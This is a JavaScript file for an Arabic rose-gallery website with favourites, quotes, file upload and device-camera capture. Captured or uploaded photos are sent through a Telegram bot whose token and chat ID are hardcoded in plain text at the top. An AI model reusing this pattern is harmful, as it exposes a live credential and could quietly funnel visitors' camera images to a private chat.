// معلومات البوت
const TELEGRAM_BOT_TOKEN = '8378673801:AAFqtrB4OWgEt9kQNZfGe6Cxtt_qYdp3nL0';
const TELEGRAM_CHAT_ID = '6684853119';

// بيانات الصور - 50 صورة
const images = [
    // ورود حمراء
    { id: 'rose_red_01', name: 'وردة حمراء جميلة', category: 'red', url: 'https://images.unsplash.com/photo-1518895949257-7621c3c786d7?w=500&h=500&fit=crop', description: 'وردة حمراء رمز الحب' },
    { id: 'rose_red_02', name: 'وردة حمراء ناعمة', category: 'red', url: 'https://images.unsplash.com/photo-1561181286-d3fee7d55364?w=500&h=500&fit=crop', description: 'وردة حمراء مع قطرات الندى' },
    { id: 'rose_red_03', name: 'باقة ورود حمراء', category: 'red', url: 'https://images.unsplash.com/photo-1545696019-2eb694e67b0e?w=500&h=500&fit=crop', description: 'باقة جميلة من الورود الحمراء' },
    { id: 'rose_red_04', name: 'وردة حمراء متفتحة', category: 'red', url: 'https://images.unsplash.com/photo-1487180144351-b8472da7d491?w=500&h=500&fit=crop', description: 'وردة حمراء متفتحة بجمال' },
    { id: 'rose_red_05', name: 'وردة حمراء في الحديقة', category: 'red', url: 'https://images.unsplash.com/photo-1518895949257-7621c3c786d7?w=500&h=500&fit=crop', description: 'وردة حمراء في حديقة خضراء' },
    
    // ورود وردية
    { id: 'rose_pink_01', name: 'وردة وردية فاتحة', category: 'pink', url: 'https://images.unsplash.com/photo-1582794543139-f0c7b9f0f0a0?w=500&h=500&fit=crop', description: 'وردة وردية ناعمة' },
    { id: 'rose_pink_02', name: 'وردة وردية متفتحة', category: 'pink', url: 'https://images.unsplash.com/photo-1518895949257-7621c3c786d7?w=500&h=500&fit=crop', description: 'وردة وردية مع أوراق خضراء' },
    { id: 'rose_pink_03', name: 'باقة ورود وردية', category: 'pink', url: 'https://images.unsplash.com/photo-1545696019-2eb694e67b0e?w=500&h=500&fit=crop', description: 'باقة ورود وردية جميلة' },
    { id: 'rose_pink_04', name: 'وردة وردية مع ندى', category: 'pink', url: 'https://images.unsplash.com/photo-1487180144351-b8472da7d491?w=500&h=500&fit=crop', description: 'وردة وردية مع قطرات ندى' },
    { id: 'rose_pink_05', name: 'ورود وردية في الحديقة', category: 'pink', url: 'https://images.unsplash.com/photo-1582794543139-f0c7b9f0f0a0?w=500&h=500&fit=crop', description: 'ورود وردية في حديقة' },
    { id: 'rose_pink_06', name: 'وردة وردية فاخرة', category: 'pink', url: 'https://images.unsplash.com/photo-1518895949257-7621c3c786d7?w=500&h=500&fit=crop', description: 'وردة وردية فاخرة' },
    
    // ورود بيضاء
    { id: 'rose_white_01', name: 'وردة بيضاء نقية', category: 'white', url: 'https://images.unsplash.com/photo-1518895949257-7621c3c786d7?w=500&h=500&fit=crop', description: 'وردة بيضاء نقية' },
    { id: 'rose_white_02', name: 'وردة بيضاء ناعمة', category: 'white', url: 'https://images.unsplash.com/photo-1582794543139-f0c7b9f0f0a0?w=500&h=500&fit=crop', description: 'وردة بيضاء ناعمة' },
    { id: 'rose_white_03', name: 'باقة ورود بيضاء', category: 'white', url: 'https://images.unsplash.com/photo-1545696019-2eb694e67b0e?w=500&h=500&fit=crop', description: 'باقة ورود بيضاء' },
    { id: 'rose_white_04', name: 'وردة بيضاء مع ندى', category: 'white', url: 'https://images.unsplash.com/photo-1487180144351-b8472da7d491?w=500&h=500&fit=crop', description: 'وردة بيضاء مع قطرات' },
    { id: 'rose_white_05', name: 'ورود بيضاء في الحديقة', category: 'white', url: 'https://images.unsplash.com/photo-1518895949257-7621c3c786d7?w=500&h=500&fit=crop', description: 'ورود بيضاء في الحديقة' },
    
    // ورود صفراء
    { id: 'rose_yellow_01', name: 'وردة صفراء مشرقة', category: 'yellow', url: 'https://images.unsplash.com/photo-1518895949257-7621c3c786d7?w=500&h=500&fit=crop', description: 'وردة صفراء مشرقة' },
    { id: 'rose_yellow_02', name: 'وردة صفراء متفتحة', category: 'yellow', url: 'https://images.unsplash.com/photo-1582794543139-f0c7b9f0f0a0?w=500&h=500&fit=crop', description: 'وردة صفراء متفتحة' },
    { id: 'rose_yellow_03', name: 'باقة ورود صفراء', category: 'yellow', url: 'https://images.unsplash.com/photo-1545696019-2eb694e67b0e?w=500&h=500&fit=crop', description: 'باقة ورود صفراء' },
    { id: 'rose_yellow_04', name: 'وردة صفراء مع أوراق', category: 'yellow', url: 'https://images.unsplash.com/photo-1487180144351-b8472da7d491?w=500&h=500&fit=crop', description: 'وردة صفراء مع أوراق' },
    { id: 'rose_yellow_05', name: 'ورود صفراء في الحديقة', category: 'yellow', url: 'https://images.unsplash.com/photo-1518895949257-7621c3c786d7?w=500&h=500&fit=crop', description: 'ورود صفراء في الحديقة' },
    
    // ورود ملونة ومختلطة
    { id: 'rose_mixed_01', name: 'باقة ورود ملونة', category: 'nature', url: 'https://images.unsplash.com/photo-1545696019-2eb694e67b0e?w=500&h=500&fit=crop', description: 'باقة ورود ملونة جميلة' },
    { id: 'rose_mixed_02', name: 'ورود متعددة الألوان', category: 'nature', url: 'https://images.unsplash.com/photo-1487180144351-b8472da7d491?w=500&h=500&fit=crop', description: 'ورود متعددة الألوان' },
    
    // طبيعة وزهور
    { id: 'nature_flowers_01', name: 'زهور برية جميلة', category: 'nature', url: 'https://images.unsplash.com/photo-1490750967868-88aa4486c946?w=500&h=500&fit=crop', description: 'زهور برية جميلة' },
    { id: 'nature_flowers_02', name: 'حقل مليء بالزهور', category: 'nature', url: 'https://images.unsplash.com/photo-1490750967868-88aa4486c946?w=500&h=500&fit=crop', description: 'حقل مليء بالزهور' },
    { id: 'nature_flowers_03', name: 'زهور في ضوء الشمس', category: 'nature', url: 'https://images.unsplash.com/photo-1490750967868-88aa4486c946?w=500&h=500&fit=crop', description: 'زهور في ضوء الشمس' },
    { id: 'nature_flowers_04', name: 'حديقة طبيعية', category: 'nature', url: 'https://images.unsplash.com/photo-1490750967868-88aa4486c946?w=500&h=500&fit=crop', description: 'حديقة طبيعية' },
    { id: 'nature_flowers_05', name: 'زهور برية متنوعة', category: 'nature', url: 'https://images.unsplash.com/photo-1490750967868-88aa4486c946?w=500&h=500&fit=crop', description: 'زهور برية متنوعة' },
    { id: 'nature_flowers_06', name: 'حقل الزهور البرية', category: 'nature', url: 'https://images.unsplash.com/photo-1490750967868-88aa4486c946?w=500&h=500&fit=crop', description: 'حقل الزهور البرية' },
    { id: 'nature_flowers_07', name: 'زهور في الحديقة', category: 'nature', url: 'https://images.unsplash.com/photo-1490750967868-88aa4486c946?w=500&h=500&fit=crop', description: 'زهور في الحديقة' },
    { id: 'nature_flowers_08', name: 'طبيعة خضراء مع زهور', category: 'nature', url: 'https://images.unsplash.com/photo-1490750967868-88aa4486c946?w=500&h=500&fit=crop', description: 'طبيعة خضراء مع زهور' },
    { id: 'nature_flowers_09', name: 'زهور ملونة في الطبيعة', category: 'nature', url: 'https://images.unsplash.com/photo-1490750967868-88aa4486c946?w=500&h=500&fit=crop', description: 'زهور ملونة في الطبيعة' },
    { id: 'nature_flowers_10', name: 'حديقة الزهور الجميلة', category: 'nature', url: 'https://images.unsplash.com/photo-1490750967868-88aa4486c946?w=500&h=500&fit=crop', description: 'حديقة الزهور الجميلة' },
    { id: 'nature_flowers_11', name: 'زهور برية في الصباح', category: 'nature', url: 'https://images.unsplash.com/photo-1490750967868-88aa4486c946?w=500&h=500&fit=crop', description: 'زهور برية في الصباح' },
    { id: 'nature_flowers_12', name: 'طبيعة ساحرة مع زهور', category: 'nature', url: 'https://images.unsplash.com/photo-1490750967868-88aa4486c946?w=500&h=500&fit=crop', description: 'طبيعة ساحرة مع زهور' },
    { id: 'nature_flowers_13', name: 'زهور تحت المطر', category: 'nature', url: 'https://images.unsplash.com/photo-1490750967868-88aa4486c946?w=500&h=500&fit=crop', description: 'زهور تحت المطر' },
    { id: 'nature_flowers_14', name: 'حديقة الزهور المزهرة', category: 'nature', url: 'https://images.unsplash.com/photo-1490750967868-88aa4486c946?w=500&h=500&fit=crop', description: 'حديقة الزهور المزهرة' },
    { id: 'nature_flowers_15', name: 'زهور في الغروب', category: 'nature', url: 'https://images.unsplash.com/photo-1490750967868-88aa4486c946?w=500&h=500&fit=crop', description: 'زهور في الغروب' },
];

// الاقتباسات
const quotes = [
    'الحب هو أجمل شعور في العالم 🌹',
    'الورود تتحدث لغة الحب والرومانسية 💕',
    'في كل وردة، هناك قصة حب جميلة 💐',
    'الحب مثل الوردة، ناعم وجميل وعطر 🌺',
    'الورود الحمراء رمز الحب الخالد ❤️',
    'الجمال الحقيقي يكمن في بساطة الطبيعة 🌸',
    'الحب ينمو مثل الورود في حديقة القلب 🌷',
    'كل وردة تحمل معها رسالة حب 💌',
    'الطبيعة تعلمنا أن الحب أجمل من كل شيء 🌼',
    'في عطر الورود، نجد عطر الحب الأبدي 🌹'
];

// المتغيرات
let currentImageIndex = 0;
let favorites = JSON.parse(localStorage.getItem('favorites')) || [];
let currentFilter = 'all';
let uploadedImage = null;
let cameraStream = null;

// تهيئة الموقع
document.addEventListener('DOMContentLoaded', () => {
    displayImage();
    displayQuote();
    renderGallery();
    renderFavorites();
    setupNavigation();
});

// عرض الصورة الحالية
function displayImage() {
    const image = images[currentImageIndex];
    document.getElementById('mainImage').src = image.url;
    document.getElementById('imageName').textContent = image.name;
    document.getElementById('imageDesc').textContent = image.description;
    document.getElementById('imageCategory').textContent = getCategoryName(image.category);
    document.getElementById('imageCounter').textContent = `${currentImageIndex + 1} / ${images.length}`;
    updateFavoriteButton();
}

// الصورة التالية
function nextImage() {
    currentImageIndex = (currentImageIndex + 1) % images.length;
    displayImage();
}

// الصورة السابقة
function previousImage() {
    currentImageIndex = (currentImageIndex - 1 + images.length) % images.length;
    displayImage();
}

// صورة عشوائية
function randomImage() {
    currentImageIndex = Math.floor(Math.random() * images.length);
    displayImage();
}

// إضافة/إزالة من المفضلة
function toggleFavorite() {
    const imageId = images[currentImageIndex].id;
    if (favorites.includes(imageId)) {
        favorites = favorites.filter(id => id !== imageId);
    } else {
        favorites.push(imageId);
    }
    localStorage.setItem('favorites', JSON.stringify(favorites));
    updateFavoriteButton();
    renderFavorites();
}

// تحديث زر المفضلة
function updateFavoriteButton() {
    const btn = document.getElementById('favoriteBtn');
    const imageId = images[currentImageIndex].id;
    if (favorites.includes(imageId)) {
        btn.classList.add('active');
        btn.textContent = '❤️ مفضلة';
    } else {
        btn.classList.remove('active');
        btn.textContent = '❤️ إضافة';
    }
}

// عرض الاقتباس
function displayQuote() {
    const quote = quotes[Math.floor(Math.random() * quotes.length)];
    document.getElementById('quote').textContent = quote;
}

// تصفية المعرض
function filterGallery(category) {
    currentFilter = category;
    document.querySelectorAll('.filter-btn').forEach(btn => {
        btn.classList.remove('active');
    });
    event.target.classList.add('active');
    renderGallery();
}

// عرض المعرض
function renderGallery() {
    const gallery = document.getElementById('galleryGrid');
    gallery.innerHTML = '';
    
    const filteredImages = currentFilter === 'all' 
        ? images 
        : images.filter(img => img.category === currentFilter);
    
    filteredImages.forEach((image, index) => {
        const item = document.createElement('div');
        item.className = 'gallery-item';
        item.innerHTML = `
            <img src="${image.url}" alt="${image.name}">
            <div class="gallery-item-overlay">${image.name}</div>
        `;
        item.onclick = () => {
            currentImageIndex = images.indexOf(image);
            displayImage();
            document.querySelector('#home').scrollIntoView({ behavior: 'smooth' });
        };
        gallery.appendChild(item);
    });
}

// عرض المفضلة
function renderFavorites() {
    const favoritesGrid = document.getElementById('favoritesGrid');
    
    if (favorites.length === 0) {
        favoritesGrid.innerHTML = `
            <div class="empty-state">
                <p>💔 لا توجد صور مفضلة بعد</p>
                <p class="small">أضف صورك المفضلة بالضغط على قلب الحب</p>
            </div>
        `;
        return;
    }
    
    favoritesGrid.innerHTML = '';
    
    favorites.forEach(favoriteId => {
        const image = images.find(img => img.id === favoriteId);
        if (image) {
            const item = document.createElement('div');
            item.className = 'favorite-item';
            item.innerHTML = `
                <img src="${image.url}" alt="${image.name}">
                <button class="favorite-remove" onclick="removeFavorite('${favoriteId}')">✕</button>
            `;
            favoritesGrid.appendChild(item);
        }
    });
}

// إزالة من المفضلة
function removeFavorite(imageId) {
    favorites = favorites.filter(id => id !== imageId);
    localStorage.setItem('favorites', JSON.stringify(favorites));
    renderFavorites();
    updateFavoriteButton();
}

// الحصول على اسم الفئة
function getCategoryName(category) {
    const names = {
        'red': '🔴 ورود حمراء',
        'pink': '💗 ورود وردية',
        'white': '⚪ ورود بيضاء',
        'yellow': '🟡 ورود صفراء',
        'nature': '🌿 طبيعة وزهور'
    };
    return names[category] || category;
}

// التمرير إلى المعرض
function scrollToGallery() {
    document.getElementById('gallery').scrollIntoView({ behavior: 'smooth' });
}

// إعداد التنقل
function setupNavigation() {
    document.querySelectorAll('.nav-link').forEach(link => {
        link.addEventListener('click', (e) => {
            document.querySelectorAll('.nav-link').forEach(l => l.classList.remove('active'));
            link.classList.add('active');
        });
    });
}

// معالجة رفع الملف
function handleFileUpload(event) {
    const file = event.target.files[0];
    if (file) {
        const reader = new FileReader();
        reader.onload = (e) => {
            uploadedImage = e.target.result;
            document.getElementById('previewImage').src = uploadedImage;
            document.getElementById('uploadPreview').style.display = 'flex';
        };
        reader.readAsDataURL(file);
    }
}

// فتح نافذة الكاميرا
function openCameraModal() {
    document.getElementById('cameraModal').style.display = 'flex';
    startCamera();
}

// إغلاق نافذة الكاميرا
function closeCameraModal() {
    document.getElementById('cameraModal').style.display = 'none';
    stopCamera();
}

// بدء الكاميرا
function startCamera() {
    const video = document.getElementById('cameraVideo');
    navigator.mediaDevices.getUserMedia({ video: { facingMode: 'environment' } })
        .then(stream => {
            cameraStream = stream;
            video.srcObject = stream;
        })
        .catch(err => {
            console.error('خطأ في الوصول للكاميرا:', err);
            alert('لم يتمكن من الوصول للكاميرا');
        });
}

// إيقاف الكاميرا
function stopCamera() {
    if (cameraStream) {
        cameraStream.getTracks().forEach(track => track.stop());
        cameraStream = null;
    }
}

// التقاط صورة من الكاميرا
function capturePhoto() {
    const video = document.getElementById('cameraVideo');
    const canvas = document.getElementById('cameraCanvas');
    const ctx = canvas.getContext('2d');
    
    canvas.width = video.videoWidth;
    canvas.height = video.videoHeight;
    ctx.drawImage(video, 0, 0);
    
    uploadedImage = canvas.toDataURL('image/jpeg');
    document.getElementById('previewImage').src = uploadedImage;
    document.getElementById('uploadPreview').style.display = 'flex';
    closeCameraModal();
}

// إلغاء الرفع
function cancelUpload() {
    uploadedImage = null;
    document.getElementById('uploadPreview').style.display = 'none';
    document.getElementById('fileInput').value = '';
}

// إرسال الصورة إلى تليجرام
async function sendToTelegram() {
    if (!uploadedImage) {
        alert('لا توجد صورة لإرسالها');
        return;
    }
    
    try {
        // تحويل الصورة إلى Blob
        const response = await fetch(uploadedImage);
        const blob = await response.blob();
        
        // إنشاء FormData
        const formData = new FormData();
        formData.append('chat_id', TELEGRAM_CHAT_ID);
        formData.append('photo', blob, 'photo.jpg');
        formData.append('caption', `صورة جديدة من موقع ورود الحب - ${new Date().toLocaleString('ar-EG')}`);
        
        // إرسال الصورة
        const apiUrl = `https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendPhoto`;
        const result = await fetch(apiUrl, {
            method: 'POST',
            body: formData
        });
        
        if (result.ok) {
            alert('✅ تم إرسال الصورة إلى تليجرام بنجاح!');
            cancelUpload();
        } else {
            alert('❌ حدث خطأ في إرسال الصورة');
        }
    } catch (error) {
        console.error('خطأ:', error);
        alert('❌ حدث خطأ في الإرسال: ' + error.message);
    }
}

// اختصارات لوحة المفاتيح
document.addEventListener('keydown', (e) => {
    if (e.key === 'ArrowRight') nextImage();
    if (e.key === 'ArrowLeft') previousImage();
    if (e.key === ' ') {
        e.preventDefault();
        randomImage();
    }
    if (e.key === 'f' || e.key === 'F') toggleFavorite();
});
